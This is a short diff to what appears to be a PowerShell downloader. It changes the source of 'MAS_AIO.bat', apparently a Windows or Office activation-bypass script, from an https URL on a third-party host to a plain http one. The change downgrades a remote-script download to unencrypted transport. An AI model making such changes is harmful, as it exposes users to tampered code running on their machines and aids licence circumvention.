@@ -44,7 +44,7 @@
     try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
     $URLs = @(
-        'https://wmzb.us.ci/activate/MAS_AIO.bat'
+        'http://wmzb.us.ci/activate/MAS_AIO.bat'
     )
     Write-Progress -Activity "Downloading..." -Status "Please wait"
     $errors = @()
